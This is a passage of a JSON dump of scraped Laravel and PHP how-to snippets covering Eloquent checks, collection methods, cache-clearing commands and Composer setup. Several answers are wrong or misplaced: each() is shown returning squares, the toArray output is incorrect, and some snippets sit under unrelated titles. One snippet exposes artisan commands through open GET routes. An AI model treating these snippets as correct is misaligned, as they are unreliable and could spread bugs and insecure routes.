    "description": "if($product->isDirty('price')){     // price has changed }\nif($product->isDirty()){     // changes have been made } \nclass UserObserver {       /**      * Listen to the User created event.      *      * @param  \\App\\User  $user      * @return void      */     public function updating(User $user)     {       if($user->isDirty('email')){         // email has changed         $new_email = $user->email;          $old_email = $user->getOriginal('email');       }     }  } \n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2132,
    "keyword": null,
    "link": null,
    "title": " laravel check if laravel query is empty",
    "description": "if ($result->first()) { }  if (!$result->isEmpty()) { } if ($result->count()) { } if (count($result)) { }\n    @if ($query === null)     {         <h4 style=\"text-transform: lowercase;\">no results for: #{{ $query }}</h4>         }     @else      {                 <h4 style=\"text-transform: lowercase;\">results for: #{{ $query }}</h4>         }         @endif  \n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2133,
    "keyword": null,
    "link": null,
    "title": " laravel check if model relation exists",
    "description": "$model->relation()->exists()\n",
    "reg_date": "2021-10-12T10:15:42.000Z"
  },
  {
    "id": 2134,
    "keyword": null,
    "link": null,
    "title": " laravel check if object empty",
    "description": "@if(!$contacts->isEmpty()) //do something @else You dont have contacts @endif\n// Check if object is empty $data = []; if(blank($data)){ // This object is empty            } \n",
    "reg_date": "2021-10-12T10:15:42.000Z"
  },
  {
    "id": 2135,
    "keyword": null,
    "link": null,
    "title": " laravel check if relation is null",
    "description": "// filter models that do not have any related items: 1. Model::has('relation')->get()  // Once you have a model, if you already have loaded the collection,  //  you can check the count of the collection: 2. $model->relation->count();  // If you want to check without loading the relation,  // you can run a query on the relation: 3. $model->relation()->exists();  4. count($model->relation)    5. is_null($model->relation)\n",
    "reg_date": "2021-10-12T10:15:42.000Z"
  },
  {
    "id": 2136,
    "keyword": null,
    "link": null,
    "title": " laravel check if request is empty",
    "description": "// https://laravel.com/docs/8.x/requests // Determines if a value is present on the request if($request->has('name')) {    // logic ... }  // Determine if a value is present on the request and is not empty if($request->filled('name')) {    // Not empty \t// Logic .. } // OR if(!empty($request->input('user_id'))) {    // Not empty \t// Logic .. }   // Check if All Request Input empty / not if(count($request->all()) > 0) {   // all request input not empty.   // Logic .... } else {   // all request inputs empty.   // Logic } \n",
    "reg_date": "2021-10-12T10:15:42.000Z"
  },
  {
    "id": 2137,
    "keyword": null,
    "link": null,
    "title": " laravel check if request wantsjson",
    "description": "extends the Symfony\\Component\\HttpFoundation\\Request   Determine If The Request Is Asking For JSON if (Request::wantsJson()) {     // }\n",
    "reg_date": "2021-10-12T10:15:42.000Z"
  },
  {
    "id": 2138,
    "keyword": null,
    "link": null,
    "title": " laravel check if session variable exists",
    "description": "if(Session::has('...'))\n",
    "reg_date": "2021-10-12T10:15:42.000Z"
  },
  {
    "id": 2139,
    "keyword": null,
    "link": null,
    "title": " laravel check if table has column",
    "description": "if (Schema::hasColumn('users', 'phone')) {  \tSchema::table('users', function (Blueprint $table){        $table->dropColumn('phone');     }); }\n// You may check for the existence of a table or column // using the hasTable and hasColumn methods:  if (Schema::hasTable('users')) {     // The \"users\" table exists... }  if (Schema::hasColumn('users', 'email')) {     // The \"users\" table exists and has an \"email\" column... }\nSchema::hasColumn('users', 'email') // laravel\nif (Schema::hasTable('users')) {     // The \"users\" table exists... }  if (Schema::hasColumn('users', 'email')) {     // The \"users\" table exists and has an \"email\" column... }\n",
    "reg_date": "2021-10-12T10:15:42.000Z"
  },
  {
    "id": 2140,
    "keyword": null,
    "link": null,
    "title": " laravel check my laravel version",
    "description": "php artisan --version\nphp artisan --version  //enter in terminal\n",
    "reg_date": "2021-10-12T10:15:42.000Z"
  },
  {
    "id": 2141,
    "keyword": null,
    "link": null,
    "title": " laravel check record exists",
    "description": "$user = User::where('email', '=', Input::get('email'))->first(); if ($user === null) {    // user doesn't exist }\nif (User::where('email', '=', Input::get('email'))->exists()) {    // user found }\n//User::  User is going to be what model you use. //$user can be what ever you need it to be $user = User::where('email', '=', Input::get('email'))->first(); if ($user != null) {    // Record does exist }\n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2142,
    "keyword": null,
    "link": null,
    "title": " laravel checkbox terms and conditions",
    "description": "<form action=\"/checkbox-example\" method=\"POST\">         @csrf         <label>Your Name</label>         <input type=\"text\" name=\"name\"/><br/><br/>         <input type=\"checkbox\" name=\"terms\">         <label>Do you agree to Terms & Conditions</label><br/><br/>         <button type=\"submit\">Submit</button>  </form>\n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2143,
    "keyword": null,
    "link": null,
    "title": " laravel chunk select",
    "description": "DB::table('users')->chunk(100, function($users) {     foreach ($users as $user)     {         //     } });\n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2144,
    "keyword": null,
    "link": null,
    "title": " laravel ckeditor",
    "description": "composer require unisharp/laravel-ckeditor \n    <script src=\"/vendor/unisharp/laravel-ckeditor/ckeditor.js\"></script>     <script src=\"/vendor/unisharp/laravel-ckeditor/adapters/jquery.js\"></script>     <script>         $('textarea').ckeditor();         // $('.textarea').ckeditor(); // if class is prefered.     </script>\n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2145,
    "keyword": null,
    "link": null,
    "title": " laravel clear all cache",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n#laravel php artisan clear  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\nphp artisan optimize:clear\n /laravel-project php artisan optimize:clear                   ok at 11:35:12 pm  Compiled views cleared! Application cache cleared! Route cache cleared! Configuration cache cleared! Compiled services and packages files removed! Caches cleared successfully! \n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2146,
    "keyword": null,
    "link": null,
    "title": " laravel clear cache",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n/**[SAFE] Clears all cache with 1 line!**/  php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled\nphp artisan optimize:clear\n//Laravel 7 / 2021-01 php artisan cache:clear php artisan route:clear php artisan config:clear php artisan optimize\n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2147,
    "keyword": null,
    "link": null,
    "title": " laravel clear everything",
    "description": "php artisan optimize:clear\n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2148,
    "keyword": null,
    "link": null,
    "title": " laravel clear page cache",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//Borra la cache de laravel: Solo copia y pega. php artisan config:cache && php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled   \nphp artisan view:clear  \n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2149,
    "keyword": null,
    "link": null,
    "title": " laravel clear route cache",
    "description": "php artisan cache:clear  php artisan route:cache   \nphp artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Clear Cache facade value: Route::get('/clear-cache', function() {     $exitCode = Artisan::call('cache:clear');     return '<h1>Cache facade value cleared</h1>'; });  //Reoptimized class loader: Route::get('/optimize', function() {     $exitCode = Artisan::call('optimize');     return '<h1>Reoptimized class loader</h1>'; });  //Route cache: Route::get('/route-cache', function() {     $exitCode = Artisan::call('route:cache');     return '<h1>Routes cached</h1>'; });  //Clear Route cache: Route::get('/route-clear', function() {     $exitCode = Artisan::call('route:clear');     return '<h1>Route cache cleared</h1>'; });  //Clear View cache: Route::get('/view-clear', function() {     $exitCode = Artisan::call('view:clear');     return '<h1>View cache cleared</h1>'; });  //Clear Config cache: Route::get('/config-cache', function() {     $exitCode = Artisan::call('config:cache');     return '<h1>Clear Config cleared</h1>'; }); \n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2150,
    "keyword": null,
    "link": null,
    "title": " laravel clear table",
    "description": "// Delete everythin in the table  // Option 1  Project::truncate();  // Option 2 Project::whereNotNull('id')->delete();  // Option 3 Project::where('id', 'like' '%%')->delete();  // Option 4 DB::table('projects')->delete();\nMyModel::truncate();\nVisitor::query()->truncate();\n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2151,
    "keyword": null,
    "link": null,
    "title": " laravel click view details in table",
    "description": " <div class=\"col-sm-12\">         <div class=\"content\">           <table class=\"table table-striped\" id=\"myTable\">             <thead>               <tr>                 <th>Title</th>                  <th>Slug</th>                 <th>Category</th>                 <th>Status</th>                 <th>Date</th>               </tr>             </thead>             <tbody>               @if(count($posts) > 0)               @foreach($posts as $post)               <tr>                 <td>{{ $post->title }}</td>                 <td>{{ $post->slug }}</td>                 <td>{{ $post->category_id }}</td>                 <td>{{ $post->status }}</td>                 <td>{{ $post->created_at }}</td>                             </tr>               @endforeach               @else               <tr>                  <td>No data Found.</td>                           </tr>               @endif               </tbody>           </table>         </div>       </div>\n",
    "reg_date": "2021-10-12T10:15:43.000Z"
  },
  {
    "id": 2152,
    "keyword": null,
    "link": null,
    "title": " laravel clone row",
    "description": "$data = Model::find(1); $new_data = $data->replicate(); $new_data->created_at = now(); $new_data->save();\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2153,
    "keyword": null,
    "link": null,
    "title": " laravel collection count",
    "description": "$collection = collect([1, 2, 3, 4]);  $filtered = $collection->filter(function ($value, $key) {     return $value > 2; });  $filtered->all();  // [3, 4]\n$collection = collect([1, 2, 3, 4]);  $collection->count();  // 4\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2154,
    "keyword": null,
    "link": null,
    "title": " laravel collection each",
    "description": "$collection = $collection->each(function ($item, $key) {     // });\ncollect([1, 2, 3, 4])->every(function ($value, $key) {     return $value > 2; });  // false\n$collection->each(function ($item, $key) {     hj });\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2155,
    "keyword": null,
    "link": null,
    "title": " laravel collection filter",
    "description": "$collection = collect([1, 2, 3, 4]);  $filtered = $collection->filter(function ($value, $key) {     return $value > 2; });  $filtered->all();  // [3, 4]\n// The array we're going to return     $data = [];     // Query the users table $query = users::where('id', 1)->get();  // Let's Map the results from [$query] $map = $query->map(     function($items){           $data['user_firstName'] = $items->firstName;           $data['user_lastName'] = $items->lastName;           return $data;         }     );  return $map;\n$itemCollection = collect($contacts); $filtered = $itemCollection->filter(function($item) use ($search) {     return stripos($item['username'],$search) !== false; }); \n$collection = collect([1, 2, 3]);  $total = $collection->reduce(function ($carry, $item) {     return $carry + $item; });  // 6  $total = $collection->reduce(function ($carry, $item) {     return $carry + $item; }, 4);  // 10   | where 4 is a initial value\n$collection = collect([1,2,3,4]);  $collection->each(function($item){     return $item*$item; });  // [1,4,9,16]\npublic function index() {     $myStudents = [         ['id'=>1, 'name'=>'Hardik', 'mark' => 80],         ['id'=>2, 'name'=>'Paresh', 'mark' => 20],         ['id'=>3, 'name'=>'Akash', 'mark' => 34],         ['id'=>4, 'name'=>'Sagar', 'mark' => 45],     ];        $myStudents = collect($myStudents);         $passedstudents = $myStudents->filter(function ($value, $key) {         return data_get($value, 'mark') > 34;     });         $passedstudents = $passedstudents->all();         dd($passedstudents); }\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2156,
    "keyword": null,
    "link": null,
    "title": " laravel collection find by key",
    "description": "$collection = collect([     ['product_id' => 'prod-100', 'name' => 'Desk'],     ['product_id' => 'prod-200', 'name' => 'Chair'], ]);  $keyed = $collection->keyBy('product_id');  $keyed->all();  /*     [         'prod-100' => ['product_id' => 'prod-100', 'name' => 'Desk'],         'prod-200' => ['product_id' => 'prod-200', 'name' => 'Chair'],     ] */\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2157,
    "keyword": null,
    "link": null,
    "title": " laravel collection find duplicates",
    "description": "// Retrieve the first task $task = Task::first();  $newTask = $task->replicate(); $newTask->project_id = 16; // the new project_id $newTask->save();\n$users = Users::all(); $usersUnique = $users->unique('id'); $usersDupes = $users->diff($usersUnique);  dd($users, $usersUnique, $usersDupes);\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2158,
    "keyword": null,
    "link": null,
    "title": " laravel collection flatten",
    "description": "$collection = collect(['name' => 'taylor', 'languages' => ['php', 'javascript']]);  $flattened = $collection->flatten();  $flattened->all();  // ['taylor', 'php', 'javascript'];\n$collection = collect([1,2,3,4]);  $collection->each(function($item){     return $item*$item; });  // [1,4,9,16]\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2159,
    "keyword": null,
    "link": null,
    "title": " laravel collection group",
    "description": "$collection = collect([     ['account_id' => 'account-x10', 'product' => 'Chair'],     ['account_id' => 'account-x10', 'product' => 'Bookcase'],     ['account_id' => 'account-x11', 'product' => 'Desk'], ]);  $grouped = $collection->groupBy('account_id');  $grouped->toArray();  /*     [         'account-x10' => [             ['account_id' => 'account-x10', 'product' => 'Chair'],             ['account_id' => 'account-x10', 'product' => 'Bookcase'],         ],         'account-x11' => [             ['account_id' => 'account-x11', 'product' => 'Desk'],         ],     ] */\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2160,
    "keyword": null,
    "link": null,
    "title": " laravel collection groupBy",
    "description": "$collection = collect([     ['account_id' => 'account-x10', 'product' => 'Chair'],     ['account_id' => 'account-x10', 'product' => 'Bookcase'],     ['account_id' => 'account-x11', 'product' => 'Desk'], ]);  $grouped = $collection->groupBy('account_id');  $grouped->toArray();  /*     [         'account-x10' => [             ['account_id' => 'account-x10', 'product' => 'Chair'],             ['account_id' => 'account-x10', 'product' => 'Bookcase'],         ],         'account-x11' => [             ['account_id' => 'account-x11', 'product' => 'Desk'],         ],     ] */\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2161,
    "keyword": null,
    "link": null,
    "title": " laravel collection group by",
    "description": "$collection = collect([     ['account_id' => 'account-x10', 'product' => 'Chair'],     ['account_id' => 'account-x10', 'product' => 'Bookcase'],     ['account_id' => 'account-x11', 'product' => 'Desk'], ]);  $grouped = $collection->groupBy('account_id');  $grouped->toArray();  /*     [         'account-x10' => [             ['account_id' => 'account-x10', 'product' => 'Chair'],             ['account_id' => 'account-x10', 'product' => 'Bookcase'],         ],         'account-x11' => [             ['account_id' => 'account-x11', 'product' => 'Desk'],         ],     ] */\n",
    "reg_date": "2021-10-12T10:15:44.000Z"
  },
  {
    "id": 2162,
    "keyword": null,
    "link": null,
    "title": " laravel collection implode",
    "description": "$collection = collect([     ['account_id' => 1, 'product' => 'Desk'],     ['account_id' => 2, 'product' => 'Chair'], ]);  $collection->implode('product', ', ');  // Desk, Chair\n$collection = collect([1,2,3,4]);  $collection->each(function($item){     return $item*$item; });  // [1,4,9,16]\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2163,
    "keyword": null,
    "link": null,
    "title": " laravel collection keyBy",
    "description": "$collection = collect([     ['product_id' => 'prod-100', 'name' => 'Desk'],     ['product_id' => 'prod-200', 'name' => 'Chair'], ]);  $keyed = $collection->keyBy('product_id');  $keyed->all();  /*     [         'prod-100' => ['product_id' => 'prod-100', 'name' => 'Desk'],         'prod-200' => ['product_id' => 'prod-200', 'name' => 'Chair'],     ] */\n$collection = collect([1, 2, 3, 4]);  $filtered = $collection->filter(function ($value, $key) {     return $value > 2; });  $filtered->all();  // [3, 4]\n$item = collect(); $item->push($product);\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2164,
    "keyword": null,
    "link": null,
    "title": " laravel collection merge",
    "description": "/*   * The merge method merges the given array or collection with the original collection.  * If a string key in the given items matches a string key in the original collection,  * the given items's value will overwrite the value in the original collection:  */ $collection = collect(['product_id' => 1, 'price' => 100]); $merged = $collection->merge(['price' => 200, 'discount' => false]); $merged->all(); // ['product_id' => 1, 'price' => 200, 'discount' => false]  // If the given items's keys are numeric, the values will be appended to the end of the collection: $collection = collect(['Desk', 'Chair']); $merged = $collection->merge(['Bookcase', 'Door']); $merged->all(); // ['Desk', 'Chair', 'Bookcase', 'Door']\n$collection = collect(['product_id' => 1, 'price' => 100]);  $merged = $collection->merge(['price' => 200, 'discount' => false]);  $merged->all();  // ['product_id' => 1, 'price' => 200, 'discount' => false]\n$collection = collect(['John Doe']);  $concatenated = $collection->concat(['Jane Doe'])->concat(['name' => 'Johnny Doe']);  $concatenated->all();  // ['John Doe', 'Jane Doe', 'Johnny Doe'] \n$collection = collect(['name', 'age']);  $combined = $collection->combine(['George', 29]);  $combined->all();  // ['name' => 'George', 'age' => 29]\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2165,
    "keyword": null,
    "link": null,
    "title": " laravel collection order",
    "description": "$collection = collect([1, 2, 3, 4]);  $filtered = $collection->filter(function ($value, $key) {     return $value > 2; });  $filtered->all();  // [3, 4]\n$collection = collect([5, 3, 1, 2, 4]);  $sorted = $collection->sortDesc();  $sorted->values()->all();  // [5, 4, 3, 2, 1]\n$collection = collect([     ['name' => 'Taylor Otwell', 'age' => 34],     ['name' => 'Abigail Otwell', 'age' => 30],     ['name' => 'Taylor Otwell', 'age' => 36],     ['name' => 'Abigail Otwell', 'age' => 32], ]);  $sorted = $collection->sortBy([     fn ($a, $b) => $a['name'] <=> $b['name'],     fn ($a, $b) => $b['age'] <=> $a['age'], ]);  $sorted->values()->all();  /*     [         ['name' => 'Abigail Otwell', 'age' => 32],         ['name' => 'Abigail Otwell', 'age' => 30],         ['name' => 'Taylor Otwell', 'age' => 36],         ['name' => 'Taylor Otwell', 'age' => 34],     ] */\n$collection = collect([     ['name' => 'Desk', 'price' => 200],     ['name' => 'Chair', 'price' => 100],     ['name' => 'Bookcase', 'price' => 150], ]);  $sorted = $collection->sortBy('price');  $sorted->values()->all();  /*     [         ['name' => 'Chair', 'price' => 100],         ['name' => 'Bookcase', 'price' => 150],         ['name' => 'Desk', 'price' => 200],     ] */\n$users = Users::pluck('name','email'); dd($users);\n$collection = collect([5, 3, 1, 2, 4]);  $sorted = $collection->sort();  $sorted->values()->all();  // [1, 2, 3, 4, 5]\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2166,
    "keyword": null,
    "link": null,
    "title": " laravel collection pluck",
    "description": "$users = User::all()->pluck('field_name'); //for keys instead of [User::all()->pluck('id');] use $user_ids = User::all()->modelKeys();\n// QUESTION When We should use Pluck method in laravel???  // ANSWER You might often run into a situation where you have to  extract certain values (excluding the keys) from a collection  then you should use pluck(). i.e (when you only need value, not the key)    //Example 1 let we have a list of results and we only need the value of one colum  $attendees = collect([     ['name' => 'Bradmen', 'email' => 'bradmen@gmail.com', 'city' => 'London'],     ['name' => 'Jhon Doe', 'email' => 'doe@gmail.com', 'city' => 'paris'],     ['name' => 'Martin', 'email' => 'martin@gmail.com', 'city' => 'washington'], ]);  $names = $attendees->pluck('name') //Reult ['Bradmen', 'Jhon Doe', 'Martin'];  //Example 2 OR You can use like this    $users = User::all(); $usernames = $users->pluck('username'); \n$collection = collect([     ['product_id' => 'prod-100', 'name' => 'Desk'],     ['product_id' => 'prod-200', 'name' => 'Chair'], ]);  $plucked = $collection->pluck('name');  $plucked->all();  // ['Desk', 'Chair']\n$array = [     ['developer' => ['id' => 1, 'name' => 'Taylor']],     ['developer' => ['id' => 2, 'name' => 'Abigail']], ];  $array = array_pluck($array, 'developer.name');  // ['Taylor', 'Abigail'];\n$name = DB::table('users')->where('name', 'John')->pluck('name');\n$users = Users::pluck('name','email'); dd($users);\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2167,
    "keyword": null,
    "link": null,
    "title": " laravel collection remove duplicates",
    "description": "$array = array(1, 2, 2, 3); $array = array_unique($array); // Array is now (1, 2, 3) \n$unique = $collection->unique();\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2168,
    "keyword": null,
    "link": null,
    "title": " laravel collection remove item",
    "description": "forget() The forget method removes an item from the collection by its key:  $collection = collect(['name' => 'taylor', 'framework' => 'laravel']);  $collection->forget('name');  $collection->all();  // ['framework' => 'laravel']  Another example  $permissions->forget([2, 3, 4]);  Source  https://laravel.com/docs/8.x/collections#method-forget\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2169,
    "keyword": null,
    "link": null,
    "title": " laravel collection reverse",
    "description": "$collection = collect([1, 2, 3, 4, 5]);  $reversed = $collection->reverse();  $reversed->all();  // [5, 4, 3, 2, 1]\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2170,
    "keyword": null,
    "link": null,
    "title": " laravel collection shuffle",
    "description": "$collection = collect([1, 2, 3, 4, 5]);  $shuffled = $collection->shuffle();  $shuffled->all();  // [3, 2, 5, 1, 4] - (generated randomly)\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2171,
    "keyword": null,
    "link": null,
    "title": " laravel collection sortBy",
    "description": "$response = $f_games->merge($s_games)->sortByDesc('id')->values(); \n/**  * Show the application dashboard.  *  * @return \\Illuminate\\Http\\Response  */ public function index() {     $messages = Message::select(\"*\")                             ->where('receiver_id',$id)                             ->orderBy('created_at', 'desc')                             ->get();        dd($messages); }\n$collection = collect([5, 3, 1, 2, 4]);  $sorted = $collection->sortDesc();  $sorted->values()->all();  // [5, 4, 3, 2, 1]\n$collection = collect([     ['name' => 'Taylor Otwell', 'age' => 34],     ['name' => 'Abigail Otwell', 'age' => 30],     ['name' => 'Taylor Otwell', 'age' => 36],     ['name' => 'Abigail Otwell', 'age' => 32], ]);  $sorted = $collection->sortBy([     fn ($a, $b) => $a['name'] <=> $b['name'],     fn ($a, $b) => $b['age'] <=> $a['age'], ]);  $sorted->values()->all();  /*     [         ['name' => 'Abigail Otwell', 'age' => 32],         ['name' => 'Abigail Otwell', 'age' => 30],         ['name' => 'Taylor Otwell', 'age' => 36],         ['name' => 'Taylor Otwell', 'age' => 34],     ] */\n$posts = Post::orderBy('id', 'DESC')->get(); \n$collection = collect([     ['name' => 'Desk', 'price' => 200],     ['name' => 'Chair', 'price' => 100],     ['name' => 'Bookcase', 'price' => 150], ]);  $sorted = $collection->sortBy('price');  $sorted->values()->all();  /*     [         ['name' => 'Chair', 'price' => 100],         ['name' => 'Bookcase', 'price' => 150],         ['name' => 'Desk', 'price' => 200],     ] */\n",
    "reg_date": "2021-10-12T10:15:45.000Z"
  },
  {
    "id": 2172,
    "keyword": null,
    "link": null,
    "title": " laravel collection toArray",
    "description": "$collection = collect(['name' => 'Desk', 'price' => 200]);  $collection->toArray();  /*     [         ['name' => 'Desk', 'price' => 200],     ] */\n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2173,
    "keyword": null,
    "link": null,
    "title": " laravel collection toJson",
    "description": "$collection = collect(['name' => 'Desk', 'price' => 200]);  $collection->toJson();  // '{\"name\":\"Desk\", \"price\":200}'\n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2174,
    "keyword": null,
    "link": null,
    "title": " laravel collection unique",
    "description": "$collection = collect([1, 2, 3, 4]);  $filtered = $collection->filter(function ($value, $key) {     return $value > 2; });  $filtered->all();  // [3, 4]\n$collection = collect([1, 1, 2, 2, 3, 4, 2]);  $unique = $collection->unique();  $unique->values()->all();  // [1, 2, 3, 4]\n$item = collect(); $item->push($product);\n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */  public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n'required|email|unique:company_users,email_address,NULL,id,company_id,' . $request->company_id \n$users = $users->unique();\n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2175,
    "keyword": null,
    "link": null,
    "title": " laravel command not found",
    "description": "export PATH=\"$PATH:$HOME/.composer/vendor/bin\" \nexport PATH=~/.config/composer/vendor/bin:$PATH  source ~/.bashrc\necho 'export PATH=\"~/.config/composer/vendor/bin\"' >> ~/.bashrc # or echo 'export PATH=\"~/.config/composer/vendor/bin\"' >> ~/.zshrc\n#these commands executed on Ubunyu 20.04 export PATH=~/.config/composer/vendor/bin:$PATH source ~/.bashrc\nsource ~/.bashrc \ncomposer global require \"laravel/installer\" \n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2176,
    "keyword": null,
    "link": null,
    "title": " laravel command parameter optional",
    "description": "protected $signature = 'order:check {--silent=y}'        public function handle() { $silent = $this->option('silent'); if ($this->confirm('This will run the command code continue?') || $silent) {\n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2177,
    "keyword": null,
    "link": null,
    "title": " laravel command to create symlink storage",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2178,
    "keyword": null,
    "link": null,
    "title": " laravel commands to refresh env file",
    "description": "// NOTE: Five most important commands if your Laravel is not working //\t     as expected after some modifications in .env or database folder  php artisan config:clear php artisan cache:clear composer dump-autoload php artisan view:clear php artisan route:clear\n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2179,
    "keyword": null,
    "link": null,
    "title": " laravel composer",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\n1. composer create-project laravel/laravel example-app 2. cd example-app 3. php artisan serve\n// To install and use a specific version, you can enter it at the end of the command. // For example using version 5.8 ==> composer create-project --prefer-dist laravel/laravel projectName \"5.8.*\"\ncomposer global require laravel/installer  laravel new blog\ncomposer global require laravel/installer  laravel new example-app  php artisan serve\ncomposer create-project --prefer-dist laravel/laravel ProjectName dev-develop\n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2180,
    "keyword": null,
    "link": null,
    "title": " laravel composer install ignore",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2181,
    "keyword": null,
    "link": null,
    "title": " laravel composer require laravel/jet laravel/jetstream",
    "description": "composer require laravel/jetstream \n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2182,
    "keyword": null,
    "link": null,
    "title": " laravel composer update",
    "description": "FIRST METHOD : =============== # uninstall the package composer global remove laravel/installer  # reinstall composer global require laravel/installer    SECOND METHOD :  ================    Just upgraded from Laravel 7 to 8, and running    composer global require \"laravel/installer:^4.0\"   did the trick for me (i.e., without removeing first)\nphp composer.phar update\ncomposer global require \"laravel/installer:^4.0\" \nuse App\\Models\\Flight;  $flight = Flight::find(1);  $flight->name = 'Paris to London';  $flight->save();\n$flight = App\\Models\\Flight::find(1);  $flight->name = 'New Flight Name';  $flight->save();\nconst CREATED_AT = 'creation_date'; const UPDATED_AT = 'last_update'; \n",
    "reg_date": "2021-10-12T10:15:46.000Z"
  },
  {
    "id": 2183,
    "keyword": null,
    "link": null,
    "title": " laravel controller middleware",
    "description": "php artisan make:middleware nameOfMiddleware\nclass UserController extends Controller {     /**      * Instantiate a new controller instance.      *      * @return void      */     public function __construct()     {         $this->middleware('auth');          $this->middleware('log')->only('index');          $this->middleware('subscribed')->except('store');     } }\n<?php  namespace App\\Http\\Middleware;  use Closure;  class CheckAge {     /**      * Handle an incoming request.      *      * @param  \\Illuminate\\Http\\Request  $request      * @param  \\Closure  $next      * @return mixed      */     public function handle($request, Closure $next)     {         if ($request->age <= 200) {             return redirect('home');         }          return $next($request);     } }\n<?php  namespace App\\Http\\Middleware;  use Closure;  class BeforeMiddleware {     public function handle($request, Closure $next)     {         // Perform action          return $next($request);     } }  \n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2184,
    "keyword": null,
    "link": null,
    "title": " laravel controller return message",
    "description": "#In Controller use Session;         Session::flash('message', \"Special message goes here\"); return Redirect::back();  #In View @if (Session::has('message'))    <div class=\"alert alert-info\">{{ Session::get('message') }}</div> @endif\n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2185,
    "keyword": null,
    "link": null,
    "title": " laravel convert timestamp to date",
    "description": "laravel convert timestamp to date date('Y-m-d', strtotime($date));  laravel convert date to timestamp date('Y-m-d H:i:s', strtotime($date));\n  $timestamp = strtotime(\"13-10-2013 15:00\"); \n$date = '2021-05-20'; date('Y-m-d H:i:s', strtotime($date));\n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2186,
    "keyword": null,
    "link": null,
    "title": " laravel create",
